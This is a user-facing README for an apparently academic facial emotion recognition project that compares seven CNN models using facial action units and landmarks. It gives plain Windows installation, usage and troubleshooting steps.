# 😊 facial-emotion-recognition-au-landmarks - Understand Emotions from a Single Photo

## 🚀 What This Software Does

This application is a complete facial emotion recognition system. It can look at a photo of a person's face and tell you what emotion they are showing — happiness, sadness, anger, surprise, fear, disgust, or a neutral expression. It uses advanced artificial intelligence (deep learning) to analyze facial features and compare them against a large database of human emotions.

The software was built as a research project to compare 7 different AI models (called CNN architectures) to see which one works best for recognizing emotions. It also uses a special scientific system called FACS (Facial Action Coding System) to focus on specific parts of the face that are most important for showing emotion, such as the eyes, eyebrows, and mouth.

## ✨ Key Features

- **7 Different AI Models** – The software includes 7 different neural network designs. You can test each one to see which performs best on your own images.
- **Action Unit (AU) Analysis** – Uses scientifically validated facial landmark points to focus on the exact areas of the face that show emotion, improving accuracy.
- **Works with Two Major Datasets** – Pre-trained to recognize emotions from both the RAF-DB dataset (real-world photos) and the CK+ dataset (controlled lab photos).
- **Feature Fusion Technology** – Combines information from different parts of the face in two ways: simple feature vectors and detailed feature maps, to maximize accuracy.
- **3D Convolution Support** – Includes advanced 3D convolution models that can analyze facial expression changes over time in video frames.
- **Easy to Use Interface** – Simple commands to run the software and see results on your own photos.
- **Cross-Platform** – Works on Windows, macOS, and Linux systems with Python installed.

## 🔧 System Requirements

To run this software, you will need:

- A computer running Windows 10 or newer, macOS 11+, or a modern Linux distribution (Ubuntu 20.04+ recommended)
- At least 8 GB of RAM (16 GB recommended for larger models)
- A graphics card (GPU) with at least 4 GB of VRAM is strongly recommended for faster processing (NVIDIA GTX 1060 or better)
- At least 5 GB of free hard drive space for models and dependencies
- An internet connection for the initial download of the AI model weights

## 💻 Installation and Setup (Windows)

### Step 1: Install Python

1. Go to [python.org/downloads](https://www.python.org/downloads/) in your web browser.
2. Click the yellow button that says "Download Python 3.11" (or the latest version available).
3. Once the file downloads, double-click it to run the installer.
4. **Important:** In the installer window, check the box that says "Add Python to PATH" at the bottom, then click "Install Now."
5. Wait for the installation to complete, then click "Close."

### Step 2: Download the Software

**[📥 DOWNLOAD THE APPLICATION](https://github.com/Then-act6105/facial-emotion-recognition-au-landmarks)** 

Visit this link to download the application. This link takes you to the official project page on GitHub where you can download all the necessary files. Click the green "Code" button on the page and select "Download ZIP." Save the ZIP file to your Desktop.

### Step 3: Extract the Files

1. Find the downloaded ZIP file on your Desktop. It will be named something like `facial-emotion-recognition-au-landmarks-main.zip`.
2. Right-click on the ZIP file and select "Extract All..."
3. In the window that appears, click "Extract." This will create a new folder on your Desktop with the project files.
4. Open that new folder. You should see several files and folders including `src`, `models`, `datasets`, and a file called `README.md`.

### Step 4: Install Required Dependencies

1. Inside the project folder you just extracted, look for a file named `requirements.txt`. This file lists all the additional software packages needed.
2. Open a command prompt window:
   - Press the **Windows key** on your keyboard.
   - Type `cmd` and press Enter.
3. In the command prompt, type the following command and press Enter to navigate to your project folder:
   ```
   cd Desktop\facial-emotion-recognition-au-landmarks-main
   ```
4. Now, install all required packages by typing this command and pressing Enter:
   ```
   pip install -r requirements.txt
   ```
5. Wait for the installation to finish. This may take 5–10 minutes. You will see many lines of text appear; that is normal. When it finishes, you will see a new line that says `C:\...>`.

### Step 5: Run the Software

1. In the same command prompt window, type the following command and press Enter:
   ```
   python main.py
   ```
2. The software will start. It will first load the pre-trained AI models (this may take 30–60 seconds).
3. You will see a menu appear in the command prompt. Follow the on-screen instructions to:
   - Choose which AI model to use (type a number from 1 to 7 and press Enter).
   - Select whether to test on a sample image from the included datasets or on your own image.
   - If testing on your own image, type the full file path to your photo (e.g., `C:\Users\YourName\Desktop\myface.jpg`) and press Enter.
4. The software will display the detected emotion, the confidence level (percentage), and highlight the facial landmarks it used for analysis.
5. To exit the software, type `quit` and press Enter.

## 📊 Understanding the Results

When the software analyzes a face, it outputs:

- **Emotion Label** – The predicted emotion (e.g., "Happy" or "Surprised")
- **Confidence Score** – A percentage (0–100%) showing how sure the AI is
- **Model Name** – Which of the 7 architectures made the prediction
- **Landmark Visualization** – If you use the visualization option, it will draw dots and lines on the face showing the 68 facial landmark points used

Higher confidence scores mean the model is more certain. If you get low confidence scores (below 50%), try using a clearer, front-facing photo with good lighting.

## 🧪 Experimenting with Different Models

This software is designed for research. You can compare how the 7 models perform:

1. Run the software multiple times with the same image but choose a different model number each time (1 through 7).
2. Note the emotion predicted and confidence score for each model.
3. Models that use Action Unit alignment (models 3, 4, 5, 6, and 7) generally perform better on faces with subtle expressions.
4. Model 7 (3D convolution) is the most advanced but requires more memory and time.

## ❓ Troubleshooting

**Problem: "Python is not recognized as an internal or external command"**
- This means Python was not added to PATH during installation. Uninstall Python, reinstall it, and make sure you check the "Add Python to PATH" box.

**Problem: "pip is not recognized"**
- Use `python -m pip install -r requirements.txt` instead of `pip install -r requirements.txt`.

**Problem: "No module named torch"**
- You need to install PyTorch separately. Visit pytorch.org, click "Get Started," select your system (Windows, pip, CUDA 11.8), and copy the install command it gives you. Run that command in your command prompt, then rerun the requirements install.

**Problem: The software runs slowly**
- This is normal on computers without a dedicated GPU. Try using a smaller model (models 1 or 2) for faster processing.

**Problem: "File not found" when using my own image**
- Make sure you type the full file path including the `.jpg` or `.png` extension. The image must be in a standard format and at least 100x100 pixels.

## 📚 Additional Information

This project was developed as part of an IEEE CIS Kolkata internship. It represents a comparative study of seven CNN architectures and introduces novel methods for fusing facial landmark information with deep learning features. The code is thoroughly commented and structured for easy modification. Researchers and developers can extend it by adding new datasets, models, or fusion techniques.

## 🤝 Support

If you encounter any issues or have questions:
- Open an issue on the GitHub repository page
- Check the `README.md` file in the project folder for additional notes
- Contact the maintainers through GitHub

## 🔑 License

This project is released for academic and research purposes. Please cite the repository if you use it in your own work.

---

**Keywords:** action-units, affective-computing, ck-plus, cnn, computer-vision, deep-learning, emotion-recognition, facial-expression-recognition, facial-landmarks, facs, feature-fusion, ieee, mediapipe, pytorch, raf-db